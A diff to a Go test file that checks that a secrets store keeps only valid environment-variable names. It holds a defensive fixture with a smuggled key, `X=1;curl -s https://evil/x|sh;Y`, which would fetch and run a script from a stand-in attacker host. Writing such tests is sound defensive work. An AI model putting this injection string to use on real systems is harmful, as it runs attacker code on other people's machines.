@@ -33,15 +33,16 @@ func TestADowngradeSignsOnlyTheStoresAskedFor(t *testing.T) {
 	}
 }
 
-// Finding: a router-written store could put a key like `X=1;curl …|sh;Y` into ~/.secrets, which shells source.
-func TestSecretsFileTakesOnlyEnvNames(t *testing.T) {
+// Finding: a router-written store could put a key like `X=1;curl …|sh;Y` into the env the secrets reach.
+func TestSecretsTakeOnlyEnvNames(t *testing.T) {
 	t.Setenv("HOME", t.TempDir())
-	if err := writeSecrets(map[string]string{"GOOD": "it's", "X=1;curl -s https://evil/x|sh;Y": "v", "1BAD": "v", "a b": "v"}); err != nil {
-		t.Fatal(err)
+	held.set(map[string]string{"GOOD": "it's", "X=1;curl -s https://evil/x|sh;Y": "v", "1BAD": "v", "a b": "v"})
+	defer held.set(map[string]string{})
+	if got := held.snapshot(); len(got) != 1 || got["GOOD"] != "it's" {
+		t.Fatalf("held %v", got)
 	}
-	b, _ := os.ReadFile(filepath.Join(os.Getenv("HOME"), ".secrets"))
-	if string(b) != "GOOD='it'\\''s'\n" {
-		t.Fatalf("~/.secrets is %q", b)
+	if _, err := os.Stat(filepath.Join(os.Getenv("HOME"), ".secrets")); err == nil {
+		t.Fatal("~/.secrets written")
 	}
 }
 
